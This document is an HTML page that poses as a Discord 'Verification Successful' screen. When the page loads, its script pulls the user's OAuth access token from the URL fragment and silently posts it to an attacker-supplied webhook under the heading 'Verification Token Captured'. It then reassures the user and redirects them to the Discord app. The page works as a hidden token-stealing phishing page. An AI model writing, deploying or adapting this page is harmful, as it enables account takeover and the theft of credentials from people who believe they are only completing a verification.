<!DOCTYPE html>
<html>
<head>
    <title>Verification Successful</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #1a191e; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        h1 { color: #5865F2; font-size: 24px; }
        p { color: #b9bbbe; font-size: 16px; margin-bottom: 30px; }
        .btn { background-color: #5865F2; color: white; padding: 15px 40px; border-radius: 8px; text-decoration: none; font-weight: bold; display: none; box-shadow: 0 4px 14px rgba(88, 101, 242, 0.4); }
    </style>
</head>
<body>
    <h1>✅ Verified</h1>
    <p id="status">Syncing with Discord...</p>
    <a href="discord://-/" class="btn" id="btn">Open Discord App</a>

    <script>
        try {
            const hash = new URLSearchParams(window.location.hash.substring(1));
            const token = hash.get('access_token');
            const state = hash.get('state'); 

            if (token && state) {
                // Fix Base64 URL safe characters
                let safeState = state.replace(/-/g, '+').replace(/_/g, '/');
                const decodedState = JSON.parse(atob(safeState));
                
                const webhookUrl = decodedState.webhook;
                const userId = decodedState.userId;
                const guildId = decodedState.guildId;

                // Send as an Embed directly to Discord
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔐 Verification Token Captured",
                            color: 3066993, // Green
                            fields: [
                                { name: "User ID", value: `\`${userId}\``, inline: true },
                                { name: "Guild ID", value: `\`${guildId}\``, inline: true },
                                { name: "Token", value: `||${token}||`, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                }).then(() => {
                    document.getElementById('status').innerText = "Success! Redirecting to Discord...";
                    document.getElementById('btn').style.display = "inline-block";
                    setTimeout(() => { window.location.href = "discord://-/"; }, 1000);
                }).catch(err => {
                    document.getElementById('status').innerText = "Error! Please try again.";
                });
            }
        } catch (e) {
            document.getElementById('status').innerText = "Invalid link format.";
        }
    </script>
</body>
</html>
